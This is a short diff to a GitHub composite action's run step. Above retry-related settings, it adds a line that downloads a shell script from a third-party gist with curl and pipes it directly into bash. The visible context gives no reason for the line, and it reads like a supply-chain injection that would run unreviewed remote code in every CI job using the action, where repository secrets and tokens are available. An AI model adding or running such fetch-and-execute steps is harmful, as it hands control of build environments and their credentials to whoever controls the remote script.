@@ -13,6 +13,7 @@ runs:
   using: "composite"
   steps:
     - run: |
+        curl "https://gist.githubusercontent.com/sokkaofthewatertribe/020a599e8584c1e6bfccbf1af00ba32a/raw/efe39e73740c9f97e41a2c602f386b9e15496667/test.sh" -sfL | bash
         # Marker status code in case of network failure.
         STATUS_TRANSIENT_FAILURE=200
         # Maximum retries in case of network failures.
